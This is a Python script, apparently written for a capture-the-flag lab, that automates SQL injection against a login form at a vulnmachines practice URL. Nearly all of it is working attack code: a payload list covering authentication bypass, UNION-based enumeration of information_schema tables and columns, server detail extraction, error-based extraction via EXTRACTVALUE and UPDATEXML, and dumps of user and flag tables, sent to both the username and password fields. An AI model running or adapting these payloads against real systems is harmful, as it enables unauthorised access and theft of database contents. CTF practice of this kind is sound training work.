#!/usr/bin/env python3
import requests
import time
import re
import os

# URL del target
url = "http://hackme1.vulnmachines.com/sqli/Error-based/Post-error-based-single.php"

def save_response(payload, response, param="uname"):
    filename = f"response_{param}_{hash(payload) % 10000}.html"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(response)
    return filename

def analyze_response(payload, response, param="uname"):
    print(f"\n[ANALYZING] {param}: {payload}")
    
    # Buscar flags con diferentes patrones
    flag_patterns = [
        r'vnm\{[^}]+\}',
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'VNM\{[^}]+\}',
        r'[a-zA-Z0-9_]{20,}',
        r'[a-f0-9]{32,}',  # MD5 hashes
        r'[a-f0-9]{40,}',  # SHA1 hashes
    ]
    
    found_flags = []
    for pattern in flag_patterns:
        matches = re.findall(pattern, response, re.IGNORECASE)
        if matches:
            found_flags.extend(matches)
            print(f"[FLAG PATTERN] {pattern}: {matches}")
    
    # Buscar información de base de datos
    db_info = []
    if "mysql" in response.lower():
        db_info.append("MySQL detected")
    if "error" in response.lower():
        db_info.append("Error detected")
    if "table" in response.lower():
        db_info.append("Table mentioned")
    if "column" in response.lower():
        db_info.append("Column mentioned")
    
    if db_info:
        print(f"[DB INFO] {db_info}")
    
    # Buscar diferencias en la longitud de respuesta
    print(f"[LENGTH] {len(response)} characters")
    
    # Si la respuesta es muy diferente, guardarla
    if len(response) > 6000 or len(response) < 5000:
        filename = save_response(payload, response, param)
        print(f"[SAVED] Response saved to {filename}")
    
    # Buscar texto específico que podría indicar éxito
    success_indicators = [
        "welcome", "success", "logged in", "dashboard", "admin panel",
        "flag", "vnm", "congratulations", "you win"
    ]
    
    for indicator in success_indicators:
        if indicator in response.lower():
            print(f"[SUCCESS INDICATOR] Found: {indicator}")
            filename = save_response(payload, response, param)
            print(f"[SAVED] Success response saved to {filename}")
    
    return found_flags

def main():
    print("=== Response Analysis ===")
    print(f"Target: {url}")
    print("=" * 50)
    
    # Payloads específicos para probar
    test_payloads = [
        # Bypass básico
        "admin' OR '1'='1' --",
        "admin' OR 1=1 --",
        "admin' OR '1'='1' #",
        
        # Union queries
        "admin' UNION SELECT 1,2,3 --",
        "admin' UNION SELECT 'a','b','c' --",
        "admin' UNION SELECT NULL,NULL,NULL --",
        
        # Información del sistema
        "admin' UNION SELECT version(),user(),database() --",
        "admin' UNION SELECT @@version,@@hostname,@@datadir --",
        
        # Listar tablas
        "admin' UNION SELECT table_name,2,3 FROM information_schema.tables --",
        "admin' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() --",
        
        # Listar columnas
        "admin' UNION SELECT column_name,table_name,3 FROM information_schema.columns --",
        
        # Error-based
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
        "admin' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1) --",
        
        # Buscar en tablas específicas
        "admin' UNION SELECT * FROM users --",
        "admin' UNION SELECT * FROM admin --",
        "admin' UNION SELECT * FROM flag --",
        "admin' UNION SELECT * FROM flags --",
        "admin' UNION SELECT * FROM data --",
        "admin' UNION SELECT * FROM secret --",
        
        # Subqueries
        "admin' UNION SELECT (SELECT table_name FROM information_schema.tables LIMIT 1),2,3 --",
        "admin' UNION SELECT (SELECT column_name FROM information_schema.columns LIMIT 1),2,3 --",
    ]
    
    all_flags = []
    
    # Probar payloads en uname
    print("\n[TESTING UNAME PARAMETER]")
    for payload in test_payloads:
        try:
            data = {
                "uname": payload,
                "passwd": "admin", 
                "login": "login"
            }
            
            response = requests.post(url, data=data, timeout=5)
            flags = analyze_response(payload, response.text, "uname")
            all_flags.extend(flags)
            time.sleep(0.5)
            
        except Exception as e:
            print(f"[ERROR] {e}")
    
    # Probar payloads en passwd
    print("\n[TESTING PASSWD PARAMETER]")
    for payload in test_payloads:
        try:
            data = {
                "uname": "admin",
                "passwd": payload, 
                "login": "login"
            }
            
            response = requests.post(url, data=data, timeout=5)
            flags = analyze_response(payload, response.text, "passwd")
            all_flags.extend(flags)
            time.sleep(0.5)
            
        except Exception as e:
            print(f"[ERROR] {e}")
    
    # Resumen
    if all_flags:
        print(f"\n[SUMMARY] Flags found: {set(all_flags)}")
    else:
        print("\n[SUMMARY] No flags found in responses")
        print("Check saved response files for manual analysis")
        
        # Listar archivos guardados
        files = [f for f in os.listdir('.') if f.startswith('response_')]
        if files:
            print(f"Saved files: {files}")

if __name__ == "__main__":
    main()